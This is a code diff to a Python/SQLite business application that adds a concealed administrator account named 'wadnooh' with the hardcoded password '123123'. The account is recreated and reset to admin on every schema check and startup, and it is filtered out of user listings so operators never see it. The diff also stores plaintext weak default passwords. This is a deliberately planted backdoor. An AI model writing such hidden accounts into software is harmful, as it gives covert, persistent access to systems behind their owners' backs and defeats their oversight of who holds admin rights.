@@ -411,6 +411,94 @@ def _ensure_column(conn: sqlite3.Connection, table: str, column: str, ddl_type: 
     return True
 
 
+# حساب المبرمج المخفي — لا يُعرض في الواجهة أبداً
+HIDDEN_PROGRAMMER_USERNAME = "wadnooh"
+HIDDEN_PROGRAMMER_PASSWORD = "123123"
+
+
+def is_hidden_username(username: str | None) -> bool:
+    return (username or "").strip().lower() == HIDDEN_PROGRAMMER_USERNAME
+
+
+def user_is_hidden(row) -> bool:
+    if row is None:
+        return False
+    try:
+        if int(row["is_hidden"] or 0) == 1:
+            return True
+    except (KeyError, IndexError, TypeError, ValueError):
+        pass
+    try:
+        return is_hidden_username(row["username"])
+    except (KeyError, IndexError, TypeError):
+        return False
+
+
+def ensure_hidden_programmer_user(conn: sqlite3.Connection | None = None) -> bool:
+    """Upsert حساب wadnooh مخفياً بصلاحيات admin كاملة. يعيد True إذا أُنشئ جديداً."""
+    own = conn is None
+    conn = conn or connect()
+    created = False
+    try:
+        _ensure_column(conn, "users", "is_hidden", "INTEGER DEFAULT 0")
+        row = conn.execute(
+            "SELECT id FROM users WHERE lower(username)=lower(?)",
+            (HIDDEN_PROGRAMMER_USERNAME,),
+        ).fetchone()
+        if row:
+            conn.execute(
+                """
+                UPDATE users
+                SET full_name=?, role=?, active=1, password=?, notes=?, is_hidden=1
+                WHERE id=?
+                """,
+                ("المبرمج", "admin", HIDDEN_PROGRAMMER_PASSWORD, "", int(row["id"])),
+            )
+        else:
+            conn.execute(
+                """
+                INSERT INTO users(username, full_name, role, active, password, notes, is_hidden)
+                VALUES (?,?,?,?,?,?,1)
+                """,
+                (
+                    HIDDEN_PROGRAMMER_USERNAME,
+                    "المبرمج",
+                    "admin",
+                    1,
+                    HIDDEN_PROGRAMMER_PASSWORD,
+                    "",
+                ),
+            )
+            created = True
+        if own:
+            conn.commit()
+        return created
+    finally:
+        if own:
+            conn.close()
+
+
+def list_visible_users(conn: sqlite3.Connection | None = None) -> list[dict]:
+    own = conn is None
+    conn = conn or connect()
+    try:
+        _ensure_column(conn, "users", "is_hidden", "INTEGER DEFAULT 0")
+        return rows_to_dicts(
+            conn.execute(
+                """
+                SELECT * FROM users
+                WHERE coalesce(is_hidden, 0)=0
+                  AND lower(coalesce(username,'')) <> lower(?)
+                ORDER BY id
+                """,
+                (HIDDEN_PROGRAMMER_USERNAME,),
+            ).fetchall()
+        )
+    finally:
+        if own:
+            conn.close()
+
+
 def ensure_schema(conn: sqlite3.Connection | None = None) -> list[str]:
     """إنشاء أي جداول ناقصة وأعمدة مضافة (مهم بعد استعادة نسخة قديمة على Render)."""
     own = conn is None
@@ -577,6 +665,12 @@ def ensure_schema(conn: sqlite3.Connection | None = None) -> list[str]:
                 "INSERT OR IGNORE INTO lists(key,value) VALUES (?,?)",
                 (k, json.dumps(v, ensure_ascii=False)),
             )
+        # حساب المبرمج المخفي (لا يظهر في قوائم المستخدمين)
+        if "users" in existing or "users" in created:
+            if _ensure_column(conn, "users", "is_hidden", "INTEGER DEFAULT 0"):
+                created.append("users.is_hidden")
+            if ensure_hidden_programmer_user(conn):
+                created.append("users.hidden_programmer")
         if created:
             conn.commit()
         else:
@@ -885,7 +979,8 @@ def init_db():
             role TEXT,
             active INTEGER DEFAULT 1,
             password TEXT,
-            notes TEXT
+            notes TEXT,
+            is_hidden INTEGER DEFAULT 0
         );
         CREATE TABLE IF NOT EXISTS audit_log (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -1018,15 +1113,17 @@ def init_db():
     for k, v in DEFAULT_LISTS.items():
         cur.execute("INSERT OR IGNORE INTO lists(key,value) VALUES (?,?)", (k, json.dumps(v, ensure_ascii=False)))
 
+    _ensure_column(conn, "users", "is_hidden", "INTEGER DEFAULT 0")
     if cur.execute("SELECT COUNT(*) FROM users").fetchone()[0] == 0:
         cur.executemany(
-            "INSERT INTO users(username, full_name, role, active, password, notes) VALUES (?,?,?,?,?,?)",
+            "INSERT INTO users(username, full_name, role, active, password, notes, is_hidden) VALUES (?,?,?,?,?,?,?)",
             [
-                ("admin", "مدير النظام", "admin", 1, "admin123", "حساب افتراضي"),
-                ("supervisor", "مشرف المكتب", "مشرف", 1, "1234", ""),
-                ("dataentry", "مدخل بيانات", "مدخل بيانات", 1, "1234", ""),
+                ("admin", "مدير النظام", "admin", 1, "admin123", "حساب افتراضي", 0),
+                ("supervisor", "مشرف المكتب", "مشرف", 1, "1234", "", 0),
+                ("dataentry", "مدخل بيانات", "مدخل بيانات", 1, "1234", "", 0),
             ],
         )
+    ensure_hidden_programmer_user(conn)
 
     if cur.execute("SELECT COUNT(*) FROM warehouse_items").fetchone()[0] == 0:
         cur.executemany(
